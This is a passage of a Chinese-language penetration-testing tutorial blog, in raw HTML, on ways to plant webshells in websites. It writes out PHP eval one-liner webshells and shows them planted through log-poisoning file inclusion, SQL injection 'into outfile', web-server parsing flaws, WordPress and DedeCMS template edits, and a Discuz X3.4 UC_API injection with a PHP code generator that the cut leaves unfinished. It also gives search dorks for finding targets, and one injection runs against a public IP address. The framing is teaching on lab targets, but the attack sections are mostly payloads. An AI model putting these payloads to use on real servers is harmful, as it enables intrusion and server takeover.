class="line">http://dede.com/install/</span><br></pre></td></tr></table></figure><img src="http://120.48.107.243:9090/blog/2023/04/03/57b2fa4c8f0c5b72beae0c90dcf26723.png"><br>下一步 , 下一步 , 默认安装即可<br>登录后台</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/dede/login.php?gotopage=%2Fdede%2F</span><br><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure><p>漏洞复现</p><p>增加一个新广告，在广告内容框内可以插入php代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e2b7b85a6193de60ae610e96c71d58dd.png"></p><p>点击代码查看文件路径</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/752ff1746c16ee6dcbba7976afcb19dc.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/6ee4ca3fe8ea2ad89ac1dc562283b65e.png"></p><p>使用蚁剑链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/plus/ad_js.php?aid=1</span><br></pre></td></tr></table></figure><h3 id="3、图片马-x2F-日志配合文件包含getshell"><a href="#3、图片马-x2F-日志配合文件包含getshell" class="headerlink" title="3、图片马&#x2F;日志配合文件包含getshell"></a>3、图片马&#x2F;日志配合文件包含getshell</h3><p>这种方式getshell的前提 , 是要满足两个条件 , 一是存在上传点 , 可以上传图片马 , 这个基本上很好满足 , 因为大<br>部分提供服务的网站都有上传头像的地方 , 剩下的一个就是在该网站上找到文件包含的漏洞 , 然后通过文件包含图<br>片马实现getshell<br>还有一种方式就是通过包含日志实现getshell , 也很简单 , 这个时候我们只需要把payload写到日志 , 直接拼接在<br>url上 , 然后访问即可 , 此时会把url的内容写入到日志中 , 即把payload写到日志文件中 , 然后找到日志文件 , 通过<br>包含getshell<br><strong>实战中遇到的偏少</strong> , 因为文件包含漏洞 , 黑盒测试很难发现 , 除非你知道这个系统有文件包含的nday<br>案例演示<br><strong>DC5靶机演示 日志包含getshell</strong><br>下载地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-5,314/</span><br><span class="line">上课的时候 , 同学自己下载</span><br></pre></td></tr></table></figure><p>参考DC-5 , 导入需要重试 , 点x , 拍快照</p><p>靶机地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.44</span><br></pre></td></tr></table></figure><p>提交留言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.44/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=111</span><br></pre></td></tr></table></figure><p>通过观察2017的变化 , 该页面可能存在文件包含 , 但是不知道包含参数是什么 , fuzz(模糊测试) , 最终得到的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.44/thankyou.php?file=footer.php</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.44/thankyou.php?file=/etc/passwd</span><br></pre></td></tr></table></figure><p>漏洞利用 , 通过日志包含getshell</p><p>payload写入日志文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/thankyou.php?flie=&lt;?php @eval($_POST[&#x27;yjh&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>通过包含getshell , 这里的nginx日志文件路径为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>最终使用蚁剑链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.44/thankyou.php?file=/var/log/nginx/access.log</span><br><span class="line">yjh</span><br></pre></td></tr></table></figure><h3 id="4、解析漏洞getshell"><a href="#4、解析漏洞getshell" class="headerlink" title="4、解析漏洞getshell"></a>4、解析漏洞getshell</h3><p>解析漏洞getshell , 实际上也是配合 图片马&#x2F;日志 getshell , 这里借助web服务器的解析漏洞 , 实现非脚本文件后<br>缀解析成脚本的 , 这就需要大家在实战中 , 分辨出当前网站是使用了什么web服务器 , 以及利用的payload是什么<br><strong>IIS6.0解析漏洞</strong><br><code>http://www.xxx.com/xx.asp/xx.jpg</code><br><code>http://www.xxx.com/xx.asp/xx.txt</code><br><code>http://www.xxx.com/xx.asp/xx.asp;.jpg</code><br><strong>IIS7.0&#x2F;7.5、Nginx解析漏洞</strong><br><code>http://www.xxx.com/xx.jpg/.php</code><br>其中nginx解析漏洞与nginx、php版本无关,属于用户配置不当造成的解析漏洞<br><strong>Apache解析漏洞</strong><br><code>http://www.xxx.com/xx.php.owf.rar</code>从右到左解析，直到能解析出php为止<br><strong>实战中遇到的偏少</strong> , 因为对web服务器的版本或者配置有要求</p><h3 id="5、文件编辑-x2F-文件写入getshell"><a href="#5、文件编辑-x2F-文件写入getshell" class="headerlink" title="5、文件编辑&#x2F;文件写入getshell"></a>5、文件编辑&#x2F;文件写入getshell</h3><p>这类方法getshell , 实际上和文件上传差不多 , 都是把一句话木马写到文件中 , 这个方法利用的前提就是你能找到<br>文件编辑&#x2F;写入的功能点 , 或者漏洞 , 然后对应编辑&#x2F;写入的文件是 可以解析的脚本文件 , 非 html , css等静态文件<br><strong>实战中遇到的一般</strong> , 看网站后台是否具有这样的功能点<br>这个和模板文件编辑 , getshell , 差不多 , 都是编辑文件 , <strong>案例在下面演示</strong></p><h3 id="6、sql注入getshell"><a href="#6、sql注入getshell" class="headerlink" title="6、sql注入getshell"></a>6、sql注入getshell</h3><p>这个就要分数据库类型了<br>mysql数据库 , 通过注入写shell的三个前提</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.注入点是root权限</span><br><span class="line">2.知道网站的绝对路径</span><br><span class="line">3.mysql配置文件中的 secure_file_priv =&quot;&quot;</span><br></pre></td></tr></table></figure><p>案例演示<br>sql-lab靶场<br>fofa</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;sqlilabs&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.134.173:8080/sqlilabs/Less-2/?id=3</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/3ac92141b983b19a496e6a6a59e9f3fa.png"><br>手工写入shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.134.173:8080/sqlilabs/Less-2/?id=3 and 1=2 union select 1,&#x27;&lt;?php @eval(\$_POST[x]);?&gt;&#x27;,3 into outfile &#x27;/var/www/html/shell.php&#x27; --+</span><br><span class="line"></span><br><span class="line">3 and 1=2 union select 1,&#x27;&lt;?php @eval(\$_POST[x]);?&gt;&#x27;,3 into outfile &#x27;/var/www/html/shell.php&#x27; --+</span><br></pre></td></tr></table></figure><p>蚁剑链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.134.173:8080/shell.php</span><br><span class="line">x</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/3837fa2465ec6c54c8b8f258bffe8576.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/eab8398942eb64bf67d3a3a3989ba3e4.png"><br>如果对方是 sqlserver 数据库 , 需要是sa权限 , 调用 xp_cmdshell 执行系统命令 , getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inurl:&quot;.asp?id=&quot;</span><br><span class="line">其他google语句</span><br></pre></td></tr></table></figure><h2 id="二、功能点的一些getshell"><a href="#二、功能点的一些getshell" class="headerlink" title="二、功能点的一些getshell"></a>二、功能点的一些getshell</h2><h3 id="1、数据库备份getshell"><a href="#1、数据库备份getshell" class="headerlink" title="1、数据库备份getshell"></a>1、数据库备份getshell</h3><p>这类手法 , getshell , 本质的原理是通过上传图片马 , 默认是非解析后缀 ,  然后通过数据库备份的功能 , 自定义备<br>份的文件 , 以及备份后保存的文件名 , 实现解析<br>台数据库备份getshell，上传图片马并获取图片马路径，通过数据库备份修改后缀名，getshell , 通常asp站点后台居多<br>主要就是将一句话图片木马备份成ASP脚本格式的文件。具体操作步骤如下<br>1.上传一个 一句话木马图片<br>由于我已经进入后台了，随意去后台找一个上传点上传一句话木马图片就可以了<br><img src="http://120.48.107.243:9090/blog/2023/04/03/eeeb550b8f743d57b2b44c7dedd461fb.png"><br>2.备份数据库那里，修改当前数据库路径，填写备份数据库名称<br>这里，修改当前数据库路径必须为上面刚刚上传的一句话木马图片的路径；这里我把备份数据库名称写为admintony.asp<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2ccd196d4d7ee1333560617933245720.png"><br>3.连接一句话木马<br>2、编辑器漏洞getshell<br>实战中直接搜索对应的编辑器 , 然后使用漏洞的payload打就完了 , 常见的编辑器有</p><ul><li>fckeditor</li><li>ueditor</li><li>等等 …</li></ul><p>一般在asp网站后台可能会遇到 , <strong>实战用到偏少</strong></p><h3 id="3、模板文件编辑getshell"><a href="#3、模板文件编辑getshell" class="headerlink" title="3、模板文件编辑getshell"></a>3、模板文件编辑getshell</h3><p>这类手法就和前面文件编辑本质上是一样的 , 需要的前提条件就是 , 你编辑的文件是可以解析的 , 然后你可以写入<br>任意内容<br><strong>实战遇到偏多</strong><br>案例演示<br><strong>wordpress后台修改模板拿webshell</strong><br>环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/wordpress/pwnscriptum</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>网站安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.156:8080/wp-admin/install.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>登录后台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.156:8080/wp-login.php</span><br></pre></td></tr></table></figure><p>登录wordprees后台 选择 外观编辑<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1f2907024b08e6d20d354380c63794dd.png"></p><p>选择一个模板 , 这里使用404模板</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/48623495d25740f167d8c71b988b7124.png"></p><p>然后写入一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;yjh&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/49155103bf80d9b0471abca8f3ea74d8.png"><br>然后保存 , 蚁剑链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.156:8080/wp-content/themes/twentyfifteen/404.php     # 默认404路径</span><br><span class="line">yjh</span><br></pre></td></tr></table></figure><h3 id="4、修改允许上传的后缀"><a href="#4、修改允许上传的后缀" class="headerlink" title="4、修改允许上传的后缀"></a>4、修改允许上传的后缀</h3><p>这类手法getshell , 一般也是存在网站的后台功能点 , 一般在上传设置菜单中 , 然后手动新增一个php后缀即可<br>但是需要注意一点 , <strong>有的时候这个功能是假的 , 即使你新增了 , 还是不让你上传php的后缀文件</strong><br><strong>实战中遇到偏多</strong><br><img src="http://120.48.107.243:9090/blog/2023/04/03/017c07eabf13debc7177e0b321a49c84.png"></p><h2 id="三、nday"><a href="#三、nday" class="headerlink" title="三、nday"></a>三、nday</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nday 往往是实战中快速getshell的方法 , 如果给你一个网站你能识别他是什么cms 或者 框架 , 中间件 , 组件等</span><br><span class="line">那么直接google搜 , 名称getshell , 然后根据文档一步一步的打 , 如果识别不出来 , 那只能从其他方式getshell了</span><br><span class="line"></span><br><span class="line">如 : 帝国cms getshell</span><br></pre></td></tr></table></figure><h3 id="1、cms的nday"><a href="#1、cms的nday" class="headerlink" title="1、cms的nday"></a>1、cms的nday</h3><p><strong>wordpress</strong></p><ol><li><p>wordpress 介绍 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和 内容管理系统 。</span><br><span class="line"></span><br><span class="line">WordPress具有插件架构和模板系统。截至2018年4月，排名前1000万的网站中超过30.6%使用WordPress。WordPress是最受欢迎的网站内容管理系统。全球有大约30%的网站(7亿5000个)都是使用WordPress架设网站的。WordPress是目前因特网上最流行的博客系统。WordPress在最著名的网络发布阶段中脱颖而出。如今，它被使用在超过7000万个站点上。</span><br></pre></td></tr></table></figure></li><li><p>wordpress 漏洞</p></li></ol><ul><li>wordpress后台修改模板拿webshell</li><li>wordpress上传主题拿webshell</li></ul><p><strong>wordpress上传主题拿webshell复现</strong><br>环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/wordpress/pwnscriptum</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>漏洞复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把带有后门的文件加入到主题里，压缩为zip文件，上传后，程序会自动解压后，主题目录下会存在一个后门文件。</span><br></pre></td></tr></table></figure><p>wordpress主题免费下载站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cn.wordpress.org/themes/browse/new/</span><br></pre></td></tr></table></figure><p>然后把webshell直接放到压缩包中<br><img src="http://120.48.107.243:9090/blog/2023/04/03/cd856bf0c2cf6271f4cbda31894618fc.png"><br>上传主题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.156:8080/wp-admin/</span><br></pre></td></tr></table></figure><p>上传成功后，我们可以通过访问&#x2F;wp-content&#x2F;themes&#x2F;[主题名]&#x2F;[一句话木马文件名]通过蚁剑我们成功可以成功连接上去。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/897d0bd470e9680c1936a75858b288de.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.156:8080/wp-content/themes/cosmobit/yjh.php</span><br><span class="line">**dedecms**</span><br></pre></td></tr></table></figure><ol><li><p>dedecms介绍 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DedeCMS是织梦团队开发PHP 网站管理系统，它以简单、易用、高效为特色，组建出各种各样各具特色的网站，如地方门户、行业门户、政府及企事业站点等</span><br></pre></td></tr></table></figure></li><li><p>dedecms 漏洞</p></li></ol><ul><li>后台广告管理命令执行</li><li>后台任意文件上传</li><li>后台修改模块文件拿webshell</li></ul><p><strong>后台任意文件上传复现</strong><br>环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用上面搭建好的dedecms即可</span><br></pre></td></tr></table></figure><p>进入后台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/dede/</span><br></pre></td></tr></table></figure><p>通过文件式管理器 , 上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/uploads/yjh.php</span><br><span class="line">yjh</span><br></pre></td></tr></table></figure><p>使用蚁剑链接</p><p><strong>后台修改模块文件拿webshell</strong><br>环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同样使用该环境</span><br></pre></td></tr></table></figure><p>修改模板</p><p>插入一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;yjh&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>在生成 更新主页文档HTML下，将主页位置修改为index.php，生成静态的，然后更新</p><p>使用蚁剑链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/index.php</span><br><span class="line">yjh</span><br><span class="line">**Discuz!**</span><br></pre></td></tr></table></figure><ol><li><p>dz论坛介绍 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dz论坛（简称 dz!）是北京康盛新创科技有限责任公司推出的一套通用的社区论坛软件系统。自2001年6月面世以来，Discuz!已拥有15年以上的应用历史和200多万网站用户案例，是全球成熟度最高、覆盖率最大的论坛软件系统之一。目前最新版本Discuz! X3.2正式版于2015年6月9日发布，首次引入应用中心的开发模式。2010年8月23日，康盛创想与腾讯达成收购协议，成为腾讯的全资子公司。</span><br></pre></td></tr></table></figure></li><li><p>dz漏洞</p></li></ol><ul><li>Discuz_X3.4 后台 getshell</li></ul><p><strong>Discuz_X3.4 后台getshell 复现</strong><br>1.环境搭建<br>源码下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tj.mycodes.net/202103/Discuz_X3.4_SC_UTF8_20210320.zip</span><br></pre></td></tr></table></figure><p>使用 phpstudy 搭建网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dz.com/install</span><br></pre></td></tr></table></figure><p>2.漏洞复现<br>访问后台地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://dz.com/admin.php</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure><p>登录 , 访问 <code>站长</code>-<code>UCenter设置</code>，修改<code>UCenter通信密钥</code>为<code>123456</code>并记录下来 , 同时修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UC_API</span><br><span class="line">http://192.168.15.106/uc_server&#x27;);eval($_POST[sven]);//</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;);eval($_POST[sven]);//</span><br><span class="line"></span><br><span class="line">http://dz.com/uc_server</span><br><span class="line">点击提交</span><br></pre></td></tr></table></figure><p>生成code参数的值(code.php代码如下)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uc_key</span>=<span class="string">&quot;123456&quot;</span>;<span class="comment">//此处填写刚才UCenter设置的值</span></span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>() + <span class="number">720000</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;time=&quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;&amp;action=updateapps&quot;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">authcode</span>(<span class="variable">$str</span>,<span class="string">&quot;ENCODE&quot;</span>,<span class="variable">$uc_key</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%2b&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;%2f&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authcode</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$operation</span> = <span class="string">&#x27;DECODE&#x27;</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$expiry</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$ckey_length</span> = <span class="number">4</span>;</span><br><span class="line">  <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span> != <span class="string">&#x27;&#x27;</span> ? <span class="variable">$key</span> : <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">  <span class="variable">$keya</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">  <span class="variable">$keyb</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">  <span class="variable">$keyc</span> = <span class="variable">$ckey_length</span> ? (<span class="variable">$operation</span> == <span class="string">&#x27;DECODE&#x27;</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">0</span>, <span class="variable">$ckey_length</span>): <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">microtime</span>()), -<span class="variable">$ckey_length</span>)) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$cryptkey</span> = <span class="variable">$keya</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$keya</span>.<span class="variable">$keyc</span>);</span><br><span class="line">  <span class="variable">$key_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$cryptkey</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$string</span> = <span class="variable">$operation</span> == <span class="string">&#x27;DECODE&#x27;</span> ? <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="variable">$ckey_length</span>)) : <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$expiry</span> ? <span class="variable">$expiry</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>).<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$string</span>.<span class="variable">$keyb</span>), <span class="number">0</span>, <span class="number">16</span>).<span class="variable">$string</span>;</span><br><span class="line">  <span class="variable">$string_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$box</span> = <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$rndkey</span> = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">255</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$rndkey</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$cryptkey</span>[<span class="variable">$i</span> % <span class="variable">$key_length</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$box</span>[<span class="variable">$i</span>] + <span class="variable">$rndkey</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$box</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$box</span>[<span class="variable">$i</span>] = <span class="variable">$box</span>[<span class="variable">$j</span>];</span><br><span class="line">    <span class="variable">$box</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$a</span> = <span class="variable">$j</span> = <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$string_length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$a</span> = (<span class="variable">$a</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$box</span>[<span class="variable">$a</span>]) % <span class="number">256</span>;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$box</span>[<span class="variable">$a</span>];</span><br><span class="line">    <span class="variable">$box</span>[<span class="variable">$a</span>] = <span class="variable">$box</span>[<span class="variable">$j</span>];</span><br><span class="line">    <span class="variable">$box</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$result</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$string</span>[<span class="variable">$i</span>]) ^ (<span class="variable">$box</span>[(<span class="variable">$box</span>[<span class="variable">$a</span>] + <span class="variable">$box</span>[<span class="variable">$j</span>]) % <span class="number">256</span>]));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$operation</span> == <span class="string">&#x27;DECODE&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || <span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>, <span class="number">0</span>, <span class="number">10</span>) - <span class="title function_ invoke__">time</span>() &gt; <span class="number">0</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>, <span class="number">10</span>, <span class="number">16</span>) == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>, <span class="number">26</span>).<span class="variable">$keyb</span>), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>, <span class="number">26</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span 